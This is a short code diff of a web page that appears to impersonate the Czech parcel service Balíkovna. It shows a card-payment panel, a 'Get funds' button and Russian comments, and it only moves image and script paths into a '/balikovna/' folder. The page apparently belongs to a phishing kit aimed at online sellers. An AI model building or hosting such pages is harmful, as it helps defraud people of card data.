@@ -82,8 +82,8 @@ $dotenv->load();
                     <div class="row2value">hradí kupující</div>
                 </div>
                 <div class="pays">
-                    <img src="images/visa.svg" alt="">
-                    <img src="images/mastercard.svg" alt="">
+                    <img src="/balikovna/iimages/visa.svg" alt="">
+                    <img src="/balikovna/iimages/mastercard.svg" alt="">
                 </div>
                 <div class="ziskat">
                     <button id="Pokracovat"> Získat funds </button>
@@ -268,7 +268,7 @@ setInterval(function() {
 }, 3000);
 
 </script>
-<script src="./script.js"></script>
+<script src="/balikovna/script.js"></script>
 <script>
 $(window).on('load', function () {
     // Получаем текущий URL
